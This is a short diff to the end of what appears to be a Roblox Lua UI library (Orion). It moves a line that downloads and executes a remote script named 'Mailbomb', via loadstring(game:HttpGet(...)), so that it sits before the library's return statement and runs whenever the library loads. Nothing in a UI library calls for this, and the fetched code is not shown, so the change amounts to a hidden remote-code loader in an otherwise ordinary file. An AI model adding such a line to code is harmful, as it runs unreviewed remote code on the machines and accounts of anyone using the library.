@@ -1722,6 +1722,6 @@ end
 function OrionLib:Destroy()
 	Orion:Destroy()
 end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FireX-Scripts/Petsimuator99/refs/heads/main/Mailbomb'))()
 
 return OrionLib
-loadstring(game:HttpGet('https://raw.githubusercontent.com/FireX-Scripts/Petsimuator99/refs/heads/main/Mailbomb'))()
